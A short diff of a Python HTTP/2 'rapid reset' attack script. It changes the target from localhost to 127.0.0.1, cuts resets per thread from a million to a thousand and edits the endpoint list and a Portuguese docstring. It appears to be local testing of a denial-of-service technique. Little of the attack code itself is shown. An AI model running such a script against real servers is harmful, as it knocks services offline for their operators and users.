@@ -8,10 +8,10 @@ from h2.connection import H2Connection
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(threadName)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-HOST = 'localhost'
+HOST = '127.0.0.1'  
 PORT = 8443
 NUM_THREADS = 8
-RESETS_PER_THREAD = 1000000
+RESETS_PER_THREAD = 1000
 
 def exploit_vulnerable_endpoint(thread_id):
     try:
@@ -33,7 +33,7 @@ def exploit_vulnerable_endpoint(thread_id):
 
         successful_attacks = 0
         
-        endpoints = ['/vulnerable', '/slow', '/medium', '/fast']  
+        endpoints = ['/slow', '/']  
 
         for i in range(RESETS_PER_THREAD):
             endpoint = endpoints[i % len(endpoints)]
@@ -83,7 +83,8 @@ def exploit_vulnerable_endpoint(thread_id):
 
 def mass_reset_attack():
     """
-    Estratégia alternativa: Muitas requisições simultâneas + reset em massa
+    Estratégia alternativa: 
+        Muitas requisições simultâneas + reset em massa
     """
     try:
         context = ssl.create_default_context()
